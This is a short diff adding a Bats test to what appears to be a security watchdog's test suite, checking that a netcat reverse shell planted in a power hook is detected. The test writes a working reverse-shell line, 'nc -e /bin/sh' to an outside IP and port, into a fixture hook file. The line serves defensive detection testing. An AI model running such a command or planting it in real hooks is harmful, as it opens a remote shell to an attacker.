@@ -227,3 +227,15 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in power hook: netcat-listening pipe also detected — sister to /dev/tcp axis)" {
+    # Sister to sshrc/csh-config/logrotate nc reverse-shell variant
+    # INVARIANTs. netcat is a canonical RCE primitive — lock
+    # detection alongside the bash + /dev/tcp variant.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/grub-common"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
